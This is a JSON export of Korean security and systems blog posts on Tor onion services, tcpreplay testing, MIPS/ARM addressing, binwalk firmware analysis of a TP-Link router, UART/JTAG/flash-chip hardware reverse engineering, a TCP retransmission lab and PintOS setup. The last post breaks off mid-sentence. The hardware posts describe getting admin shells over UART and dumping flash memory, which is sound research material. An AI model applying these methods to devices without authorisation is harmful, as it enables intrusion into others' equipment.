[{"content":"Abstract 웹페이지 등 내가 운영중인 서버를 토어 네트워크에 돌려보자.\n01. 토어(Tor, The Onion Router)란? 토어는 1990년대 중반 고안된 익명 네트워크 기술로 미국의 해군 연구소에서 개발되었다. 클라이언트와 서버, 1:1 통신인 기존의 통신방식과 달리 Onion router라는 이름에서 유추할 수 있듯 3중으로 암호화되어 각 노드를 거쳐 최종적으로 서버에 도달하게 된다. 실제 통신의 내용은 클라이언트, 마지막 노드, 그리고 서버만 알 수 있다. 중간에 거쳐가는 노드는 암호화된 통신 내용과 다음 노드의 주소만 알고, 실제 통신의 내용은 클라이언트, 최종 노드, 그리고 서버만 알 수 있다(토어 네트워크를 거친 일반 HTTP 또는 HTTPS 웹사이트의 경우). 토어 네트워크와 .onion 주소를 통한 접속의 경우 종단간(E2E) 암호화가 적용되어 클라이언트와 서버만 그 내용을 알 수 있다. 토어 네트워크를 통한 접속은 다음과 같다. .onion 주소를 통한 접속 : 종단간(E2E) 암호화가 적용되어 가장 안전함. HTTPS over Tor(이외 기타 암호화 통신) : 여러번 암호화가 진행되며 중간 노드들은 암호화된 내용조차 확인할 수 없음. 클라이언트와 서버만 통신의 내용을 확인 가능하지만 .onion보다 덜 안전함. HTTP over Tor(이외 기타 평문 통신) : 여러번 암호화가 진행되어 클라이언트, 종단 노드, 그리고 최종 노드만 통신의 내용을 확인할 수 있음. 종단 노드 또는 서버가 통신이 검열되는 위치에 있다면 해당 구간에서 데이터가 위변조 또는 유출될 가능성이 있음. 02. 토어 설치하기 토어 설치는 토어 공식 홈페이지의 매뉴얼을 따라하면 쉽게 설치할 수 있다.\n많은 리눅스 배포판의 패키지 저장소에서 Tor를 보유하고있어 시스템 기본 패키지 관리 프로그램으로 쉽게 설치가 가능하다.\n# Debian 계열 sudo apt-get install tor # Redhat 계열 sudo yum install tor 설치가 완료되면 토어 설정 파일에 운영할 서비스를 정의한다.\n# /etc/tor/torrc HiddenServiceDir /var/lib/tor/blog # 서비스 관련 파일이 저장될 로컬 경로 HiddenServicePort 80 127.0.0.1:80 # 서비스할 포트 및 실제 서비스 위치 HiddenServicePort의 실제 서비스 위치는 토어가 돌아가는 서버에서 접근이 가능하면 내부 IP 등으로 외부 접근이 불가능해도 무관하다. 토어가 돌아가는 서버에 공인 IP를 할당하지 않아도 서비스가 가능하다. 확인해보면 TCP 9050 포트를 사용하는데, 이 포트로 요청이 들어오는 것은 아닌 것 같고 리버스 방식인 것으로 보인다. 토어 서비스를 재시작한다.\nsudo systemctl restart tor 서비스가 재구동되고 서비스 디렉토리(HiddenServiceDir)에 가보면 아래와 같은 파일들이 생성되어있다.\nhostname : 서버가 돌아가는 .onion 주소 hs_ed25519_public_key : 서버의 공개키 hs_ed25519_secret_key : 서버의 개인키 서비스 디렉토리를 보면 Tor가 ED25519 알고리즘으로 공개키/비밀키 쌍을 생성하는 것을 알 수 있다. 서버의 .onion 주소 또한 이때 생성된 공개키를 기반으로 생성된다.\n토어 서비스 구동 후 브라우저로 생성된 .onion 주소에 접속이 가능하다. 실제 토어 네트워크에 연결되서 접속이 가능하기까지 약 1~2분 정도의 시간은 필요한 것으로 보인다.\n03. .onion 주소 변경하기 .onion 주소는 생성된 ED25519 공개키를 기반하고 있어 원하는 주소로 꾸며낼 수 있다.\n실제로 DuckDuckGo 같은 토어 서비스도 \u0026ldquo;duckduckgo\u0026rdquo; 등으로 .onion 주소의 일부를 원하는 문자로 사용하고 있다.\n원하는 주소를 얻어내려면 ED25519 키 쌍을 생성한 후 .onion 주소로 변환, 원하는 문자가 포함되었는지 확인하는 식으로 진행된다. 이를 위한 자동화 도구도 공개되어 있다.\nEschalot : v2(16자) .onion 주소 생성기. v2 주소의 경우 2021년 10월부터 지원이 종료되었다. Mkp224o : v3(56자) .onion 주소 생성기 원하는 문자의 길이별로 생성하는데 걸리는 시간은 대략 아래와 같다고 한다.\n도구를 사용하여 .onion 주소를 생성한 후 HiddenServiceDir의 호스트이름, 공개키, 개인키 파일을 변경하고 재시작하면 된다.\n해당 파일 갱신 후 HiddenServiceDir 관련 디렉토리 또는 파일의 소유자가 서비스 구동 유저(debian-tor 등)가 아니라면 오류가 날 수 있다. Mkp224o를 활용하여 3일 만에 \u0026ldquo;pol4bear\u0026quot;로 시작하는 .onion 주소 생성할 수 있었다. 한 달까지도 생각하고 있었는데 생각보다 일찍 찾아냈다.\npol4bearlnj74uzsngzkatfmstlve7l54wbzqpaetsauliojt4xiu3qd.onion 이제 생성된 hostname, hs_ed25519_public_key, hs_ed25519_secret key를 HiddenServiceDir에 옮긴 후 토어 서비스를 재시작하면 해당 .onion 주소로 접속이 가능해진다.\n참고 문헌 Tor Project : How To Install Tor\nStackExchage : Why is Tor over HTTPS insecure\nOpensource.com : How to create a vanity Tor .onion web address\n","permalink":"https://pol4bear.github.io/posts/tor-setup-basic/","summary":"Abstract 웹페이지 등 내가 운영중인 서버를 토어 네트워크에 돌려보자.\n01. 토어(Tor, The Onion Router)란? 토어는 1990년대 중반 고안된 익명 네트워크 기술로 미국의 해군 연구소에서 개발되었다. 클라이언트와 서버, 1:1 통신인 기존의 통신방식과 달리 Onion router라는 이름에서 유추할 수 있듯 3중으로 암호화되어 각 노드를 거쳐 최종적으로 서버에 도달하게 된다. 실제 통신의 내용은 클라이언트, 마지막 노드, 그리고 서버만 알 수 있다. 중간에 거쳐가는 노드는 암호화된 통신 내용과 다음 노드의 주소만 알고, 실제 통신의 내용은 클라이언트, 최종 노드, 그리고 서버만 알 수 있다(토어 네트워크를 거친 일반 HTTP 또는 HTTPS 웹사이트의 경우).","title":"토어 서버 사용기"},{"content":"Abstract 내가 짠 네트워크 프로그램에 혹시 패킷 로스가 있지는 않을까? 가상 인터페이스와 TCPReplay를 이용해서 확인해보도록 하자\n01. 가상 인터페이스 추가 가상 인터페이스 또는, 더미 인터페이스는 실제 설치되어있지 않지만 마치 네트워크 인터페이스와 같은 역할을 한다.\n일반 네트워크 인터페이스를 사용할 수 도 있지만, 이미 사용되고 있는 인터페이스의 경우 불필요한 트래픽들이 많이 잡히기 때문에 가상 인터페이스를 사용한다.\n아래 명령어로 가상 인터페이스를 추가할 수 있다.\n# 인터페이스 추가 sudo ip link add dum0 type dummy # 인터페이스 활성화 sudo ifconfig dum0 up 02 . 테스트 프로그램 준비 패킷 로스가 있는지 확인할 프로그램(이하 \u0026lsquo;테스트 프로그램\u0026rsquo;이라고 한다.)과 패킷 파일을 준비한다.\n패킷은 웹 사이트 접속 패킷을 잡은 이 파일을 사용한다.\n테스트 프로그램은 인터페이스에서 잡힌 패킷을 단순 저장하는 이 프로그램을 사용한다.\n#include \u0026lt;pcap.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdio_ext.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define MAX_NAME_LEN 256 #define EXIT_IF_TRUE(STATE, ARGS...) ({ \\ if(STATE) { \\ fprintf(stderr, ARGS); \\ return 1; \\ } \\ }) pcap_t *ppcap = NULL; pcap_dumper_t *pdump = NULL; void cleanup() { pcap_breakloop(ppcap); pcap_close(ppcap); } int main(int argc, char *argv[]) { char interface_name[MAX_NAME_LEN]; char output_filename[MAX_NAME_LEN]; char errbuf[PCAP_ERRBUF_SIZE]; struct bpf_program prog; pid_t pid = 0; EXIT_IF_TRUE(argc != 3, \u0026#34;[!] Usage : %s [Interface] [Output Filename]\\n\u0026#34;, argv[0]); strcpy(interface_name, argv[1]); strcpy(output_filename, argv[2]); EXIT_IF_TRUE((ppcap = pcap_open_live(interface_name, BUFSIZ, 1, 1000, errbuf)) == NULL, \u0026#34;[!] Failed to open interface %s : %s\\n\u0026#34;, interface_name, errbuf); EXIT_IF_TRUE((pdump = pcap_dump_open(ppcap, output_filename)) == NULL, \u0026#34;[!] Failed to create %s\\n\u0026#34;, output_filename); EXIT_IF_TRUE(pcap_compile(ppcap, \u0026amp;prog, \u0026#34;tcp or udp or icmp\u0026#34;, 0, 0) \u0026lt; 0, \u0026#34;[!] Error compiling bpf filter on %s : %s\\n\u0026#34;, interface_name, pcap_geterr(ppcap)); EXIT_IF_TRUE(pcap_setfilter(ppcap, \u0026amp;prog) \u0026lt; 0, \u0026#34;[!] Error installing bpf filter on interface %s\\n\u0026#34;, interface_name); printf(\u0026#34;------------------------------\\n\u0026#34;); printf(\u0026#34;Target Interface : %s\\n\u0026#34;, interface_name); printf(\u0026#34;Output File : %s\\n\u0026#34;, output_filename); printf(\u0026#34;------------------------------\\n\u0026#34;); printf(\u0026#34;[i] Simple packet capture start\\n\u0026#34;); printf(\u0026#34;[i] Insert \u0026#39;q\u0026#39; to quit capture\\n\u0026#34;); pid = fork(); EXIT_IF_TRUE(pid == -1, \u0026#34;[!] Failed to create child process\u0026#34;); if(pid == 0) { pcap_loop(ppcap, -1, \u0026amp;pcap_dump, (char*)pdump); return 0; } do { __fpurge(stdin); printf(\u0026#34;cmd : \u0026#34;); } while(getchar() != \u0026#39;q\u0026#39;); cleanup(); return 0; } 03. 프로그램 테스트 테스트를 위해 프로그램을 실행한 후 TCPReplay로 패킷을 재전송한다.\n# -t, --topspeed : 전송할 수 있는 최대 속도로 전송 # -K : 캡처 파일을 메모리에 우선 로드한 후 전송 sudo tcpreplay -i dum0 -t -K test.pcapng 패킷을 재전송할 때 Error with PF_PACKET send() [277]: Message too long (errno=90)같은 에러가 발생할 수 있는데\nMTU를 늘리거나 tcpreplay-edit으로 MTU 크기만큼 잘라서 전송하도록 하면 된다.\n# MTU 늘리기 sudo ifconfig dum0 mtu 10000 # tcpreplay-edit 활용 sudo tcpreplay-edit -i dum0 --mtu-trunc -t -K test.pcapng ","permalink":"https://pol4bear.github.io/posts/how-to-test-network-program/","summary":"Abstract 내가 짠 네트워크 프로그램에 혹시 패킷 로스가 있지는 않을까? 가상 인터페이스와 TCPReplay를 이용해서 확인해보도록 하자\n01. 가상 인터페이스 추가 가상 인터페이스 또는, 더미 인터페이스는 실제 설치되어있지 않지만 마치 네트워크 인터페이스와 같은 역할을 한다.\n일반 네트워크 인터페이스를 사용할 수 도 있지만, 이미 사용되고 있는 인터페이스의 경우 불필요한 트래픽들이 많이 잡히기 때문에 가상 인터페이스를 사용한다.\n아래 명령어로 가상 인터페이스를 추가할 수 있다.\n# 인터페이스 추가 sudo ip link add dum0 type dummy # 인터페이스 활성화 sudo ifconfig dum0 up 02 .","title":"네트워크 프로그램 테스트하기"},{"content":"프롤로그 ARM도 MIPS와 같이 4바이트 크기의 명령어를 사용하기 때문에 하나의 명령어로는 접근할 메모리 주소를 가져올 수 없다.\n그래서, ARM은 함수와 함수 사이에 사용할 메모리를 저장해서 이 문제를 해결했다.\nARM의 주소지정 방식 Binwalk를 사용하면 바이너리에서 함수 에필로그들을 찾아낼 수 있다.\n찾아낸 주소로 가보면 함수 에필로그와 다음 함수 프롤로그 사이에 명령어가 아닌 주소들이 저장되어 있는 것을 확인할 수 있다.\n저장되어 있는 메모리 주소는 명령어의 위치에서 오프셋으로 접근해서 사용한다.\n","permalink":"https://pol4bear.github.io/posts/addressing-modes-of-arm-architecture/","summary":"프롤로그 ARM도 MIPS와 같이 4바이트 크기의 명령어를 사용하기 때문에 하나의 명령어로는 접근할 메모리 주소를 가져올 수 없다.\n그래서, ARM은 함수와 함수 사이에 사용할 메모리를 저장해서 이 문제를 해결했다.\nARM의 주소지정 방식 Binwalk를 사용하면 바이너리에서 함수 에필로그들을 찾아낼 수 있다.\n찾아낸 주소로 가보면 함수 에필로그와 다음 함수 프롤로그 사이에 명령어가 아닌 주소들이 저장되어 있는 것을 확인할 수 있다.\n저장되어 있는 메모리 주소는 명령어의 위치에서 오프셋으로 접근해서 사용한다.","title":"ARM의 주소지정 방식"},{"content":"프롤로그 MIPS는 4바이트 크기의 명령어를 사용한다.\n하지만, 메모리 주소의 크기도 4 바이트의 크기를 가지고 있어 하나의 명령어로는 메모리 주소를 가져올 수 없다.\nMIPS에서 메모리 주소를 계산하는 방식은 lui + addiu 방식과, $gp 방식이 있다.\nMIPS의 주소지정 방식 lui + addiu 방식 lui + addiu 방식은 lui와 addiu 두 개의 명령어를 이용해서 메모리 주소를 계산한다.\n메모리 주소를 계산하는 명령어는 다음과 같다.\n# MIPS big endian lui $a0, 0x0000 3c 04 00 00 addiu $a0, 0x0000 24 84 00 00 # MIPS little endian lui $a0, 0x0000 00 00 04 3c addiu $a0, 0x0000 00 00 84 24 # lui : 피연산자를 16비트 쉬프트 연산 후 저장함 # addiu : 피연산자를 더함 $a0 레지스터는 첫번째 인자를 저장한다.\n$a0부터 $a3까지 총 4개의 인자를 저장할 수 있는데 4개의 레지스터 모두 메모리 주소 계산에 사용될 수 있다.\n해당 프로그램이 lui + addiu 방식을 사용하는지는 메모리 계산에 사용하는 명령어를 검색해서 알 수 있다.\n# MIPS big endian hexdump -C firm.bin | grep \u0026#34;3c 04 .. .. 24 84 .. ..\u0026#34; --colour # MIPS little endian hexdump -C firm.bin | grep \u0026#34;.. .. 04 3c .. .. 84 24\u0026#34; --colour $gp 방식 $gp는 전역 포인터(Global Pointer)를 가리키는 레지스터다.\n한 프로그램 내의 $gp는 모두 같은 공간을 가리키고 있다.\n전역 포인터에는 참조되기 위한 주소들이 저장되어 있다.\n전역 포인터로부터 특정 오프셋 떨어져 있는 데이터를 읽어와서 메모리 주소를 계산한다.\n전역 포인터를 계산하는 명령어는 다음과 같다.\n# MIPS big endian lui $gp, 0x0000 3c 1c 00 00 addiu $gp, 0x0000 27 9c 00 00 addu $gp, $t9 03 09 e0 21 # MIPS little endian lui $gp, 0x0000 00 00 1c 3c addiu $gp, 0x0000 00 00 9c 27 addu $gp, $t9 21 e0 09 03 # lui : 피연산자를 16비트 쉬프트 연산 후 저장함 # addiu : 피연산자를 더함 # addu : 레지스터의 값을 더함 $t9 레지스터에는 현재 함수 엔트리의 시작 주소가 저장되어 있다.\n메모리 주소에 접근할 때는 $gp를 기준으로 특정 오프셋 떨어진 곳을 참조한다.\n해당 프로그램이 $gp 방식을 사용하는지는 $gp 계산에 사용하는 명령어를 검색해서 알 수 있다.\n# MIPS big endian hexdump -C firm.bin | grep \u0026#34;3c 1c .. .. 27 9c .. ..\u0026#34; --colour # MIPS little endian hexdump -C firm.bin | grep \u0026#34;.. .. 1c 3c .. .. 9c 27\u0026#34; --colour ","permalink":"https://pol4bear.github.io/posts/addressing-modes-of-mips-architecture/","summary":"프롤로그 MIPS는 4바이트 크기의 명령어를 사용한다.\n하지만, 메모리 주소의 크기도 4 바이트의 크기를 가지고 있어 하나의 명령어로는 메모리 주소를 가져올 수 없다.\nMIPS에서 메모리 주소를 계산하는 방식은 lui + addiu 방식과, $gp 방식이 있다.\nMIPS의 주소지정 방식 lui + addiu 방식 lui + addiu 방식은 lui와 addiu 두 개의 명령어를 이용해서 메모리 주소를 계산한다.\n메모리 주소를 계산하는 명령어는 다음과 같다.\n# MIPS big endian lui $a0, 0x0000 3c 04 00 00 addiu $a0, 0x0000 24 84 00 00 # MIPS little endian lui $a0, 0x0000 00 00 04 3c addiu $a0, 0x0000 00 00 84 24 # lui : 피연산자를 16비트 쉬프트 연산 후 저장함 # addiu : 피연산자를 더함 $a0 레지스터는 첫번째 인자를 저장한다.","title":"MIPS의 주소지정 방식"},{"content":"Binwalk란? 상용 제품의 경우 제품에 들어가는 펌웨어를 홈페이지에 공개해놓은 경우가 많다.\n공개된 펌웨어들을 분석해보면 대부분 바이너리 파일로 되어있다.\n펌웨어같은 바이너리 파일의 경우 https://github.com/ReFirmLabs/binwalk라는 오픈소스 도구를 이용해서 분석할 수 있다.\nBinwalk는 시그니처 기반으로 바이너리 파일에 어떠한 데이터들이 있는지 분석해준다.\n펌웨어 구조 분석 TL-WR840N은 주요 공유기 제조사 중 하나인 TP-Link의 공유기다.\n해당 공유기의 펌웨어를 binwalk로 분석하면 U-Boot 버전 정보와 커널 이미지, 그리고 다수의 압축 데이터를 발견할 수 있다.\n\u0026lsquo;-A\u0026rsquo; 옵션을 활용, 아키텍처별 명령어 시그니처를 검색해 해당 공유기가 MIPS 아키텍처인 것을 알 수 있다.\n\u0026lsquo;-e\u0026rsquo; 옵션을 활용, 펌웨어에 들어있는 것들이 무엇인지 식별하기 위해 식별된 것들을 추출한다.\n추출된 것들은 다음과 같다.\n부트로더\n커널\n공유기 관리를 위한 리소스(관리 페이지, 데이터, 이미지)\n추출된 것들을 통해 펌웨어의 구조가 다음과 같음을 알 수 있다.\nTL-840N의 경우 부트로더가 압축되어 있었는데, 이런 경우에는 실제 초기화를 수행하는 2차 부트로더는 압축되어있고, 압축된 부트로더를 압축해제하는 1차 부트로더가 따로 존재한다.\n추출된 정보를 통해 TL-WR840N은 VxWorks라는 실시간 운영체제를 사용한다는 것을 알 수 있다.\n펌웨어에 따라 리눅스 기반의 펌웨어를 사용하거나 파일시스템이 있는 경우도 있다.\n내부 바이너리의 기준 주소(Base Address) 구하기 각 아키텍처별로 메모리 주소 계산 방식을 안다면 실제로 참조하는 함수 또는 데이터의 주소를 구할 수 있다.\n바이너리의 기준 주소는 참조하는 메모리 주소 보단 낮을 것이기 때문에 메모리 주소를 통해 기준 주소를 예측할 수 있다.\n부팅이나 특정 명령어를 실행할 때 출력되는 문자열이 있는데, 함수 주소보다는 이런 문자열을 이용하면 더 쉽게 찾을 수 있다.\n포맷 스트링(%s 등)이 포함된 문자열의 경우 printf, printk 등의 함수에 참조될 가능성이 매우 높기 때문에 참조하는 부분을 찾기 쉽다.\n우연히 참조가 제대로 되는 것처럼 보일 수 있으니, 또 다른 데이터를 이용해서 이중으로 확인해야 한다.\n","permalink":"https://pol4bear.github.io/posts/reversing-embedded-device-3/","summary":"Binwalk란? 상용 제품의 경우 제품에 들어가는 펌웨어를 홈페이지에 공개해놓은 경우가 많다.\n공개된 펌웨어들을 분석해보면 대부분 바이너리 파일로 되어있다.\n펌웨어같은 바이너리 파일의 경우 https://github.com/ReFirmLabs/binwalk라는 오픈소스 도구를 이용해서 분석할 수 있다.\nBinwalk는 시그니처 기반으로 바이너리 파일에 어떠한 데이터들이 있는지 분석해준다.\n펌웨어 구조 분석 TL-WR840N은 주요 공유기 제조사 중 하나인 TP-Link의 공유기다.\n해당 공유기의 펌웨어를 binwalk로 분석하면 U-Boot 버전 정보와 커널 이미지, 그리고 다수의 압축 데이터를 발견할 수 있다.\n\u0026lsquo;-A\u0026rsquo; 옵션을 활용, 아키텍처별 명령어 시그니처를 검색해 해당 공유기가 MIPS 아키텍처인 것을 알 수 있다.","title":"펌웨어 정적분석하기"},{"content":"UART를 이용한 역공학 UART UART는 PC와 직렬 통신이 가능한 인터페이스이다.\nUSB to TTL 모듈을 이용해서 PC에서 연결 가능하다.\nVCC, GND, TX, RX 총 4개의 핀을 사용하지만,\n다른 방법으로 전력 공급이 가능하다면 VCC 핀은 사용하지 않아도 된다.\nUART 연결시 TX와 RX를 교차시켜서 연결해야 한다.\n4핀 형태의 배열이 보인다면 UART 인터페이스라고 추측 가능하다.\n하지만, AUX 같이 다른 형태로 되어있는 경우도 있다.\n정상적인 시리얼 통신을 위해서는 전송 속도(Baud Rate, 초당 심볼 전송 속도)를 정확히 맞춰줘야 한다.\n주로 사용되는 전송 속도는 1200, 2400, 4800, 9600, 19200, 38400, 57600, 그리고 115200이 있다.\nUART 핀 식별하기 VCC, GND, TX, RX가 표시되어 있는 경우도 있지만, 아닌 경우도 있다.\nUART 핀의 경우 멀티테스터기로 식별이 가능하다.\nUART 핀 같이 보이는 인터페이스를 찾았다면, 우선 GND 부터 찾아야한다.\nGND의 경우 임베디드 기기 전반에 퍼져있는데, PCB 내의 모든 GND는 연결되어있다.\nPCB 기판에서 식별되는 GND와 4개의 핀 중 하나와 연결해 봤을때 전기가 통하는 핀이 GND 핀이다.\nGND핀을 부득이하게 찾아내지 못했더라도 PCB 기판 내의 다른 GND를 이용할 수 있다.\nVCC 핀의 경우 검은선을 GND에 빨간선을 VCC로 추정되는 핀에 연결해봤을 때 3.3V~5.5V정도 전압이 측정된다면 VCC 핀이라고 식별 가능하다.\nTX 핀의 경우 VCC에 비해 낮은 전압이 측정되고, RX 핀의 경우 전압이 측정되지 않는다.\nTX핀의 경우 Logic Analyzer를 이용한다면 쉽게 식별 가능. ASCII 코드가 수신된다면 해당 핀이 TX 핀임을 확신할 수 있음\nLogic Analyzer를 사용하면 TX 핀의 식별과 더불어 전송 속도(Baud Rate)까지 식별 가능하다.\nUART 연결 UART에 연결한다면 기기별로 관리자 권한의 쉘, 부트로더 쉘 등을 사용할 수 있다.\n쉘을 이용해 플래시 메모리 덤프 등 제조사 별로 제공하는 기능을 이용해 임베디드 기기 동적 분석 가능하다.\nJTAG를 이용한 역공학 JTAG JTAG는 초기에 PCB 시험 목적으로 개발된 인터페이스로 현재는 개발을 위한 용도로 확대됐다.\n국제표준규격 IEEE 1149.1로 각 MCU 제조사별로 표준규격에 따른 사용 방법을 제공한다.\nJTAG 연결에 사용할 수 있는 상용/오픈소스 도구로는 Trace32, Jlink, STLink, OpenOCD 등이 있다.\n해당 도구들을 사용하면 MCU 디버깅과 플래시 메모리 덤프 등을 통해 휘발성/비휘발성 정보의 분석이 가능하다.\nJTAG 핀 식별 JTAG는 8, 10, 14, 16 등 다양한 핀 다양한 형태로 존재한다.\n핀의 형태로 노출되어 있지 않다면 MCU의 데이터시트를 참고해서 직접 찾아야한다.\nJTAGulator, JTAG_Finder 등의 장비를 이용해 노출된 핀이 어떤 역할을 하는지 찾아볼 수 있다.\n플래시 메모리 역공학 플래시 메모리를 분리(Off-chip)해서 분석하는 기법은 파괴적 공격(Invasive Attack)에 속한다. 플래시 메모리를 성공적으로 분리했다고 하더라도 데이터를 추출하지 못할 수 있음. 충분한 노하우가 필요한 기술이다. UART, JTAG등 다른 방법들을 충분히 시도해보고 마지막 방법으로 시도해볼만한 것이 플래시 메모리 역공학이다. 플래시 메모리 역공학 등 파괴적 공격의 경우 칩 불법 복제 노하우 때문인지 대체로 중국의 기술력이 좋다고 한다. 납땜 제거(Desoldering) 플래시 메모리의 경우 임베디드 기기에 납땜(Soldering) 되어있다.\n플래시 메모리를 분리해내기 위해서 납땜을 제거해야한다.\nDesoldering Pump, Desoldering Braid, T12-BCF2 + Flux(MCN-UV50) 등을 이용해서 납땜을 제거할 수 있다.\n플래시 메모리에서 데이터 추출 플래시를 성공적으로 분리했다면 시중에 판매되는 장비들로 데이터를 추출할 수 있다.\nACELab社 PC-3000 Flash\nruSolut社 VNR Reader\nRaw NAND vs. eMMC vs. UFS 플래시 메모리는 Raw NAND와 eMMC, UFS 등 여러가지 방식으로 나눌 수 있다.\neMMC와 UFC의 경우 데이터를 읽고 쓰기 위한 인터페이스가 존재하지만, Raw NAND의 경우 없음 → Raw NAND의 경우 두 방식에 비해 데이터를 수집하기 어렵다.\nRaw NAND의 경우 데이터를 읽기 위한 표준 인터페이스가 없기 때문에 분리한다 하더라도 못 읽을 수 있다.\n플래시 메모리 역공학을 진행하기 전에 UART, JTAG 등 다른 인터페이스를 통한 분석을 충분히 시도해보고 하는 것이 좋다.\n","permalink":"https://pol4bear.github.io/posts/reversing-embedded-device-2/","summary":"UART를 이용한 역공학 UART UART는 PC와 직렬 통신이 가능한 인터페이스이다.\nUSB to TTL 모듈을 이용해서 PC에서 연결 가능하다.\nVCC, GND, TX, RX 총 4개의 핀을 사용하지만,\n다른 방법으로 전력 공급이 가능하다면 VCC 핀은 사용하지 않아도 된다.\nUART 연결시 TX와 RX를 교차시켜서 연결해야 한다.\n4핀 형태의 배열이 보인다면 UART 인터페이스라고 추측 가능하다.\n하지만, AUX 같이 다른 형태로 되어있는 경우도 있다.\n정상적인 시리얼 통신을 위해서는 전송 속도(Baud Rate, 초당 심볼 전송 속도)를 정확히 맞춰줘야 한다.","title":"다양한 인터페이스를 활용한 임베디드 기기 역공학"},{"content":"임베디드 시스템이란? 임베디드 시스템은 하드웨어가 조합되어 특정한 목적을 수행하는 시스템이다. 특정 기능에 전념하기 때문에 설계자들이 최적화하여 크기와 생산 비용은 줄고, 신뢰성과 성능은 향상된다. 시장 상황과 비용 절감, 특허 등의 이유로 표준화된 시스템의 설계는 불가능하다. 임베디드 시스템의 구성 요소 시스템 반도체(System Semiconductor) 논리와 연산, 제어 기능 등을 수행하는 반도체\n메모리 반도체(Memory Semiconductor) 정보(Data)를 저장하는 용도로 사용되는 반도체\n플래시 메모리(Flash Memory) EEPROM(Electrically Erasable/Programmable Read Only Memory)의 일종이다.\n전원이 끊어져도 데이터를 보존(비휘발성)하는 특성을 가진다.\n컨트롤 게이트에 인가한 전압에 따라 일정량의 전자가 채워지며, 플로팅 게이트에 채워진 전자는 산화막으로 둘러싸여 차단된다.\n플래시 메모리는 반도체 칩 내부의 전자회로 형태에 따라 NOR(코드 저장)과 NAND(데이터 저장) 형으로 구분할 수 있다.\n임베디드 시스템 데이터 수집 접근 방법 휘발성 데이터 수집 절차 장치 식별・정보 수집 인터페이스 식별 인터페이스 연결 휘발성 데이터 수집 비휘발성 데이터 수집 절차 장치 식별・정보 수집 플래시 식별 플래시 Chip-off 비휘발성 데이터 수집 하드웨어 공격 방법의 종류 ","permalink":"https://pol4bear.github.io/posts/reversing-embedded-device-1/","summary":"임베디드 시스템이란? 임베디드 시스템은 하드웨어가 조합되어 특정한 목적을 수행하는 시스템이다. 특정 기능에 전념하기 때문에 설계자들이 최적화하여 크기와 생산 비용은 줄고, 신뢰성과 성능은 향상된다. 시장 상황과 비용 절감, 특허 등의 이유로 표준화된 시스템의 설계는 불가능하다. 임베디드 시스템의 구성 요소 시스템 반도체(System Semiconductor) 논리와 연산, 제어 기능 등을 수행하는 반도체\n메모리 반도체(Memory Semiconductor) 정보(Data)를 저장하는 용도로 사용되는 반도체\n플래시 메모리(Flash Memory) EEPROM(Electrically Erasable/Programmable Read Only Memory)의 일종이다.\n전원이 끊어져도 데이터를 보존(비휘발성)하는 특성을 가진다.","title":"임베디드 기기 역공학"},{"content":"아이디어 TCP 통신 환경에서 수신자로부터 ACK 패킷을 일정 시간동안 받지 않으면 송신자는 전송에 문제가 생겼음을 인지하고 재전송하게된다.\n어떠한 악의적인 목적이나 전송상의 문제로 먼저 전송된 데이터 A와 재전송된 데이터 A\u0026rsquo;가 다르다는 가정을 한다.\n수신자 측에서 A\u0026rsquo;가 재전송되기 전 소켓 버퍼에서 데이터를 빼간 상태라면 A를 이미 받은 상태겠지만 아니라면 각 운영체제 별로 어떻게 처리할까?\n시나리오 먼저 전송받은 데이터를 소켓 버퍼에 저장한 후 나중에 온 데이터를 무시한다. 소켓 버퍼에 이미 데이터가 있더라도 재전송된 데이터로 변경한다. 결론 Windows, Linux에서 각각 테스트한 결과 기존 전송받은 데이터를 유지한다는 것을 알 수 있었다. 임의로 생성된 재전송 패킷에 대한 ACK 패킷도 전송되었지만 실제로 소켓 버퍼에 적용되지는 않았다.\n캡처한 패킷\n테스트 코드\n","permalink":"https://pol4bear.github.io/posts/lab-1-tcp-retransmission/","summary":"아이디어 TCP 통신 환경에서 수신자로부터 ACK 패킷을 일정 시간동안 받지 않으면 송신자는 전송에 문제가 생겼음을 인지하고 재전송하게된다.\n어떠한 악의적인 목적이나 전송상의 문제로 먼저 전송된 데이터 A와 재전송된 데이터 A\u0026rsquo;가 다르다는 가정을 한다.\n수신자 측에서 A\u0026rsquo;가 재전송되기 전 소켓 버퍼에서 데이터를 빼간 상태라면 A를 이미 받은 상태겠지만 아니라면 각 운영체제 별로 어떻게 처리할까?\n시나리오 먼저 전송받은 데이터를 소켓 버퍼에 저장한 후 나중에 온 데이터를 무시한다. 소켓 버퍼에 이미 데이터가 있더라도 재전송된 데이터로 변경한다.","title":"실험실 1 - TCP 재전송 데이터 불일치"},{"content":"PintOS란? PintOS는 스탠포드 대학교 컴퓨터 공학과 수업 CS 140을 위해 개발된 교육용 mini OS이다. Pintos Project는 총 4단계로 나누어져 있으며, 각 단계 별로 OS의 필수 구현 사항들을 완성하게 된다.\nPintOS 개발에 필요한 기본적인 정보들과 과제들은 여기에서 확인할 수 있다.\nPintOS 빌드 환경 구축 PintOS 개발환경 구축은 리눅스 기반의 OS에 설정하도록 한다. 필자의 경우 윈도우에서 제공하는 WSL2를 이용하여 Ubuntu 20.04에서 환경을 구성했다.\n패키지 설치하기 소스코드를 가져오기 전 빌드에 필요한 패키지가 몇 가지 있다. 아래 명령어를 실행해 설치하도록 한다.\nsudo apt install build-essential git 소스코드 가져오기 최신 PintOS의 소스를 Git으로 쉽게 가져올 수 있다.\ngit clone git://pintos-os.org/pintos-anon 가져온 소스코드를 수정해서 여러 과제들을 수행할 수 있지만 개발하면서 버전 관리나 여러 문제가 생겼을 때를 대비해 Git에 올려서 작업하도록 한다.\ncd pintos-anon git remote remove origin git remote add origin https://github.com/pol4bear/pintos.git git push 빌드해보기 PintOS는 GNU Make를 빌드시스템으로 사용한다. 프로젝트 루트 디렉토리의 src/threads 폴더에 들어가 make를 입력하여 커널을 빌드해본다.\ncd [프로젝트 루트]/src/threads make 빌드가 완료되면 builds 폴더 아래 빌드된 커널이 위치한다.\ncd builds ls Makefile devices kernel.bin kernel.o lib loader.bin tests threads 환경변수 등록하기 PintOS를 쉽게 실행할 수 있도록 pintos라는 툴이 Perl 스크립트로 제공된다. 아래 파일을 환경변수에 등록한다.\nexport PATH=$PATH:[프로젝트 루트]/src/utils PintOS 실행해보기 PintOS는 Bochs와 QEMU로 가상화된 환경에서 실행해볼 수 있다. 스탠포드 대학의 프로젝트 페이지에 의하면 VMware Player에서도 테스트가 완료되었다고 한다.\nBochs의 경우 리얼타임으로 동작하는 QEMU와 VMware Player와 달리 시간을 조정할 수 있어 테스트 할 때 용이하다. PintOS를 기본 실행값은 